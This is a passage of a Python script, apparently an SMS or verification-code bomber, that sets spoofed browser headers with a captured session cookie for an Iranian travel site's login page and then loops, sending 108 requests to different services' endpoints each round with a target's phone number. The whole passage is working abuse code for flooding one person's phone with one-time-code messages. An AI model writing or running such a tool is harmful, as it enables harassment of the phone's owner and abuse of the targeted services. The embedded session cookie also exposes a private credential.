    # 'cookie': 'samesite=1; _ga_JE39P9W7NG=GS1.1.1693745953.1.0.1693745953.0.0.0; _ga=GA1.2.1295484615.1693745954; _gid=GA1.2.889902351.1693745954; _gat_gtag_UA_167755033_1=1; ci_session=%2BFKqKkvMGO5Vvz%2B6OKNLZtpZmhda69enkyfxSFob9QcX3ckkavbcGTJfo%2FUOFdvzls%2BAsW2YCwZ%2FsYX3asMrUyDbxnUz9OP5Ko1Lwinw%2FNmVY8txbIbT%2Ff9FtgzWZwoM0VXubwxc277PMsXsOB6m4Mp6BQ4GMEBfoq5ohTTOh2rZivJWutcvOCLzet4Yw1%2FYqrHPd1HVuclvRg7zCS9e94XgkoCrUndQDO5mdMt1KWmtQ8AeuSEfhjjeAxRyINvYVvmmppy8hRjrOrbZr%2BpCiDSSDWAb2yr1NOygaHiAdpVyZ3TUTxKKdmW9y%2BVVqSJtkrXg9Ny0mJhcwwyuohZemhQY90r6LVUk0bREGuvUlFXjbbJBnmi9h42f5WddDVLIOsuIvVMjoFCJVsjTtfR0eZToOgIZM4%2F2ioEALaasANk%3D',
    'origin': 'https://respina24.ir',
    'referer': 'https://respina24.ir/login',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
}

json_data108 = {
    'type': '1',
    'cellphone': num,
}

for i in range(1, chanta + 1):
    number = i 
    res1 = requests.post(url=url1, json=url1s, headers=headers)
    res2 = requests.post(url=url2, json=url2s, headers=headers)
    res3 = requests.get(url=url3, headers=headers)
    res4 = requests.post(url=url4, json=url4s, headers=headers)
    res5 = requests.post(url=url5, json=url5s, headers=headers)
    res6 = requests.post(url=url6, json=url6s, headers=headers)
    res7 = requests.post(url=url7, json=url7s, headers=headers)
    res8 = requests.post(url=url8, json=url8s, headers=headers)
    res9 = requests.post(url=url9, json=url9s, headers=headers)
    res10 = requests.post(url=url10, json=url10s, headers=headers)
    res11 = requests.post(url=url11, json=url11s, headers=headers)
    res12 = requests.post(url=url12, json=url12s, headers=headers)
    res13 = requests.post(url=url13, json=url13s, headers=headers)
    res14 = requests.post(url=url14, json=url14s, headers=headers)
    res15 = requests.post(url=url15, json=url15s, headers=headers)
    res16 = requests.post(url=url16, json=url16s, headers=headers)
    res17 = requests.post(url=url17, json=url17s, headers=headers)
    res18 = requests.post(url=url18, json=url18s, headers=headers)
    res19 = requests.post(url=url19, json=url19s, headers=headers)
    res20 = requests.post(url=url20, data=url20s, headers=headers)
    res21 = requests.post(url=url21, data=url21s, headers=headers)
    res22 = requests.post(url=url22, json=url22s, headers=headers)
    res23 = requests.post(url=url23, json=url23s, headers=headers)
    res24 = requests.post(url=url24, json=url24s, headers=headers)
    res25 = requests.post(url=url25, cookies=cookies25, headers=headers25, json=json_data25)
    res26 = requests.post(url=url26, params=params26, cookies=cookies26, headers=headers26, data=data26)
    res27 = requests.post(url=url27, params=params27, cookies=cookies27, headers=headers27, data=data27)
    res28 = requests.post(url=url28, cookies=cookies28, headers=headers28, data=data28)
    res29 = requests.post(url=url29, headers=headers29, json=json_data29)
    res30 = requests.post(url=url30, headers=headers30, json=json_data30)
    res31 = requests.post(url=url31, headers=headers31, data=data31)
    res32 = requests.post(url=url32, cookies=cookies32, headers=headers32, data=data32)
    res33 = requests.post(url=url33, cookies=cookies33, headers=headers33, data=data33)
    res34 = requests.post(url=url34, cookies=cookies34, headers=headers34, data=data34)
    res35 = requests.post(url=url35, json=url35s, headers=headers)
    res36 = requests.post(url=url36, headers=headers36, json=json_data36)
    res37 = requests.post(url=url37, json=url37s, headers=headers)
    res38 = requests.post(url=url38, cookies=cookies38, headers=headers38, json=json_data38)
    res39 = requests.post(url=url39, headers=headers39, json=json_data39)
    res40 = requests.post(url=url40, cookies=cookies40, headers=headers40, json=json_data40)
    res41 = requests.get(url=url41, headers=headers)
    res42 = requests.post(url=url42, params=params42, cookies=cookies42, headers=headers42, data=data42)
    res43 = requests.get(url=url43, headers=headers)
    res44 = requests.post(url=url44, headers=headers44, json=json_data44)
    res45 = requests.post(url=url45, headers=headers45, json=json_data45)
    res46 = requests.post(url=url46, cookies=cookies46, headers=headers46, data=data46)
    res47 = requests.post(url=url47, cookies=cookies47, headers=headers47, data=data47)
    res48 = requests.post(url=url48, cookies=cookies48, headers=headers48, data=data48)
    res49 = requests.post(url=url49, cookies=cookies49, headers=headers49, data=data49)
    res50 = requests.post(url=url50, headers=headers50, json=json_data50)
    res51 = requests.post(url=url51, cookies=cookies51, headers=headers51, data=data51)
    res52 = requests.post(url=url52, cookies=cookies52, headers=headers52, data=data52)
    res53 = requests.post(url=url53, cookies=cookies53, headers=headers53, json=json_data53)
    res54 = requests.post(url=url54, cookies=cookies54, headers=headers54, data=data54)
    res55 = requests.post(url=url55, headers=headers55, json=json_data55)
    res56 = requests.post(url=url56, cookies=cookies56, headers=headers56, json=json_data56)
    res57 = requests.post(url=url57, cookies=cookies57, headers=headers57, data=data57)
    res58 = requests.post(url=url58, headers=headers58, json=json_data58)
    res59 = requests.post(url=url59, cookies=cookies59, headers=headers59, data=data59)
    res60 = requests.post(url=url60, headers=headers60, json=json_data60)
    res61 = requests.post(url=url61, cookies=cookies61, headers=headers61, data=data61)
    res62 = requests.post(url=url62, params=params62, cookies=cookies62, headers=headers62, data=data62)
    res63 = requests.post(url=url63, cookies=cookies63, headers=headers63, data=data63)
    res64 = requests.post(url=url64, params=params64, cookies=cookies64, headers=headers64, data=data64)
    res65 = requests.post(url=url65, cookies=cookies65, headers=headers65, data=data65)
    res66 = requests.post(url=url66, cookies=cookies66, headers=headers66, json=json_data66)
    res67 = requests.post(url=url67, cookies=cookies67, headers=headers67, json=json_data67)
    res68 = requests.post(url=url68, params=params68, cookies=cookies68, headers=headers68, data=data68)
    res69 = requests.post(url=url69, params=params69, cookies=cookies69, headers=headers69, data=data69)
    res70 = requests.post(url=url70, cookies=cookies70, headers=headers70, data=data70)
    res71 = requests.post(url=url71, cookies=cookies71, headers=headers71, data=data71)
    res72 = requests.post(url=url72, cookies=cookies72, headers=headers72, data=data72)
    res73 = requests.post(url=url73, cookies=cookies73, headers=headers73, data=data73)
    res74 = requests.post(url=url74, cookies=cookies74, headers=headers74, data=data74)
    res75 = requests.post(url=url75, cookies=cookies75, headers=headers75, data=data75)
    res76 = requests.post(url=url76, cookies=cookies76, headers=headers76, data=data76)
    res77 = requests.post(url=url77, params=params77, cookies=cookies77, headers=headers77, data=data77)
    res78 = requests.post(url=url78, cookies=cookies78, headers=headers78, data=data78)
    res79 = requests.post(url=url79, cookies=cookies79, headers=headers79, json=json_data79)
    res80 = requests.post(url=url80, cookies=cookies80, headers=headers80, data=data80)
    res81 = requests.post(url=url81, cookies=cookies81, headers=headers81, data=data81)
    res82 = requests.post(url=url82, cookies=cookies82, headers=headers82, data=data82)
    res83 = requests.post(url=url83, cookies=cookies83, headers=headers83, data=data83)
    res84 = requests.post(url=url84, cookies=cookies84, headers=headers84, json=data84)
    res85 = requests.post(url=url85, cookies=cookies85, headers=headers85, data=data85)
    res86 = requests.post(url=url86, cookies=cookies86, headers=headers86, data=data86)
    res87 = requests.get(url=url87, headers=headers)
    res88 = requests.post(url=url88, cookies=cookies88, headers=headers88, json=json_data88)
    res89 = requests.post(url=url89, cookies=cookies89, headers=headers89, json=json_data89)
    res90 = requests.post(url=url90, cookies=cookies90, headers=headers90, data=data90)
    res91 = requests.post(url=url91, cookies=cookies91, headers=headers91, data=data91)
    res92 = requests.post(url=url92, cookies=cookies92, headers=headers92, data=data92)
    res93 = requests.post(url=url93, cookies=cookies93, headers=headers93, data=data93)
    res94 = requests.post(url=url94, cookies=cookies94, headers=headers94, data=data94)
    res95 = requests.post(url=url95, headers=headers95, json=json_data95)
    res96 = requests.post(url=url96, headers=headers96, json=json_data96)
    res97 = requests.post(url=url97, cookies=cookies97, headers=headers97, data=data97)
    res98 = requests.post(url=url98, cookies=cookies98, headers=headers98, data=data98)
    res99 = requests.post(url=url99, cookies=cookies99, headers=headers99, data=data99)
    res100 = requests.post(url=url100, headers=headers100, json=json_data100)
    res101 = requests.post(url=url101, cookies=cookies101, headers=headers101, data=data101)
    res102 = requests.post(url=url102, cookies=cookies102, headers=headers102, data=data102)
    res103 = requests.post(url=url103, cookies=cookies103, headers=headers103, data=data103)
    res104 = requests.post(url=url104, cookies=cookies104, headers=headers104, data=data104)
    res105 = requests.post(url=url105, cookies=cookies105, headers=headers105, data=data105)
    res106 = requests.post(url=url106, cookies=cookies106, headers=headers106, data=data106)
    res107 = requests.post(url=url107, cookies=cookies107, headers=headers107, data=data107)
    res108 = requests.post(url=url108, cookies=cookies108, headers=headers108, json=json_data108)
    print("Round", number,"complete")
sleep(10)